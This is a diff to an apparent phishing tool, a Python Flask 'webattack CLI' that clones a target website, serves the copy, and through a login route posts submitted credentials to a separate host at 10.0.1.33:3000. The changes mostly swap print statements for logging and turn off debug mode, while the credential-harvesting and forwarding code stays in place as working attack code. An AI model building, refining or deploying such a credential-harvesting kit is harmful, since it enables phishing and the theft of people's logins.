@@ -4,6 +4,10 @@ from flask import Flask, request, render_template_string, send_from_directory
 from bs4 import BeautifulSoup
 import urllib.parse
 import sys
+import logging
+
+# Set up logging to capture errors and info
+logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
 
@@ -25,7 +29,7 @@ def download_asset(url, target_folder):
                 f.write(response.content)
             return asset_name
     except requests.RequestException as e:
-        print(f"Error downloading {url}: {e}")
+        logging.error(f"Error downloading {url}: {e}")
     return None
 
 # Function to clone a website (HTML and basic resources)
@@ -34,7 +38,7 @@ def clone_website(target_url):
         # Fetch the main HTML page
         response = requests.get(target_url)
         if response.status_code != 200:
-            print(f"Failed to fetch {target_url}. Status code: {response.status_code}")
+            logging.error(f"Failed to fetch {target_url}. Status code: {response.status_code}")
             return None
 
         # Parse the HTML of the target page
@@ -70,7 +74,7 @@ def clone_website(target_url):
         return soup.prettify()
 
     except requests.RequestException as e:
-        print(f"Error occurred while cloning {target_url}: {str(e)}")
+        logging.error(f"Error occurred while cloning {target_url}: {str(e)}")
         return None
 
 # Flask route to serve the cloned website's HTML
@@ -97,17 +101,17 @@ def login():
     try:
         response = requests.post("http://10.0.1.33:3000", data=payload)
         if response.status_code == 200:
-            print(f"Credentials sent to http://10.0.1.33:3000 successfully.")
+            logging.info("Credentials sent successfully.")
         else:
-            print(f"Failed to send credentials. Status code: {response.status_code}")
+            logging.error(f"Failed to send credentials. Status code: {response.status_code}")
     except requests.RequestException as e:
-        print(f"Error sending credentials to the remote server: {e}")
-
+        logging.error(f"Error while sending credentials to the remote server: {e}")
+    
     return "Credentials received. Thank you!"
 
-# Start the Flask web server
+# Start the Flask web server without debug mode and auto-reloading
 def start_flask_server():
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=False, host='10.0.1.33', port=5000, use_reloader=False)
 
 # Main CLI loop
 def main():
@@ -118,25 +122,25 @@ def main():
         # If command is 'clone', then clone the website
         if command.startswith("clone"):
             _, target_url = command.split(" ", 1)
-            print(f"Cloning {target_url}...")
+            logging.info(f"Cloning {target_url}...")
             
             # Clone the website
             global cloned_page
             cloned_page = clone_website(target_url)
 
             if cloned_page:
-                print(f"Successfully cloned {target_url}. Hosting using Flask...")
+                logging.info(f"Successfully cloned {target_url}. Hosting using Flask...")
                 start_flask_server()
             else:
-                print(f"Failed to clone {target_url}.")
+                logging.error(f"Failed to clone {target_url}.")
 
         # Exit the program
         elif command == "exit":
-            print("Exiting webattack CLI.")
+            logging.info("Exiting webattack CLI.")
             sys.exit()
 
         else:
-            print("Invalid command. Use 'clone <target_url>' to clone a website.")
+            logging.error("Invalid command. Use 'clone <target_url>' to clone a website.")
 
 if __name__ == '__main__':
     main()
